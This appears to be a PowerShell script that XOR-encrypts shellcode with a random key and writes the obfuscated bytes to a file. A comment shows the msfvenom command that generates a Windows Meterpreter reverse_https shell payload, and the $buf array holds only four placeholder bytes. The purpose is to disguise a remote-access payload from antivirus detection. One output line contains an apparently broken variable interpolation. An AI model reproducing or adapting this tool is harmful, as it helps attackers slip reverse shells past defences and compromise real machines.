function XOR_Shellcode_Encrypter {

# msfvenom.bat -p windows/x64/meterpreter/reverse_https LHOST=127.0.0.1 LPORT=7710 -f ps1 EXITFUNC=thread
[Byte[]] $buf = 0xfc,0x48,0x83,0xe4

[byte] $XorKey = Get-Random -Maximum 255 -Minimum 10

[array]$newBytes = @()

for ($i = 0; $i -lt $buf.length; $i++) {
    $newBytes += $buf[$i] -bxor $XorKey
}

$output = [System.Text.StringBuilder]::new()
[void]$output.Append("[Byte[]] $('$buf')$encrypted = ")

foreach ($b in $newBytes) {
    [void]$output.AppendFormat("0x{0:X2}, ", $b)
}

$formattedOutput = $output.ToString().TrimEnd(', ')

Write-Output ""
Write-Output "[+] XOR Encryption Key   : $XorKey"
Write-Output "[+] Output written to buf.txt"
$formattedOutput | Out-File "$pwd\buf.txt" -Force -Encoding "utf8"

} XOR_Shellcode_Encrypter
